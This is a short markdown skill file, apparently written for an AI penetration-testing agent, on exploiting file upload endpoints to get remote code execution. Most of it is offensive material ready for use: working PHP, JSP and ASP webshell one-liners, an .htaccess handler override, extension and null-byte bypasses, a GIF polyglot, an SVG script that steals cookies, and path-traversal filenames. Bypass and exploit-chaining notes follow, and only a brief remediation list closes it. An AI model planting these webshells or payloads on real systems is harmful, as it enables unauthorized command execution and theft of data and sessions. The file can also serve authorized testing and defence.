---
name: file_upload
description: File upload attacks for RCE via extension bypass, content-type confusion, and polyglot files
---

# File Upload Attacks

## Attack Surface
- Upload endpoints with client-side-only validation (JS, HTML accept attribute)
- Servers relying on Content-Type or extension alone for type verification
- Upload dirs served with script execution enabled; filename used unsanitized in storage paths

## Detection Techniques
- Upload double extension (`.php.jpg`); test Content-Type mismatch (`image/jpeg` with PHP)
- Upload mixed-case extension (`.pHp`, `.PhAr`) to bypass case-sensitive blacklists
- Test null byte: `shell.php%00.jpg`; check if uploads are directly web-accessible

## Common Payloads

```
# PHP webshells
shell.php -> <?php system($_GET['cmd']); ?>
shell.phtml -> <?php passthru($_REQUEST['c']); ?>
.htaccess -> AddType application/x-httpd-php .jpg

# JSP/ASP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<%eval request("cmd")%>

# Extension bypass
shell.php.jpg  shell.asp;.jpg  shell.PhP  shell.php%00.jpg

# Polyglot / SVG XSS
GIF89a;<?php system($_GET['cmd']); ?>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>

# Path traversal in filename / Windows ADS
filename="../../../../var/www/html/shell.php"
shell.asp::$DATA
```

## Bypass Techniques
- Double extension: `shell.php.jpg` with misconfigured Apache handlers
- Case variation: `.pHp`, `.PHP` against case-sensitive blacklists
- Null byte: `shell.php%00.jpg`; upload `.htaccess`/`web.config` to redefine handlers
- Polyglot: valid image magic bytes (GIF89a) before PHP code
- Race condition: access file before server-side validation completes

## Exploit Chaining
- Upload + path traversal: place webshell outside upload directory
- Upload + LFI: upload code to non-executable path, include via LFI
- Upload + SSRF: SVG with XXE payload triggering server-side requests

## Remediation
- Validate by magic bytes, not extension or Content-Type alone
- Store outside web root with random filenames; `Content-Disposition: attachment`
- Re-encode images, scan with AV; set `X-Content-Type-Options: nosniff`
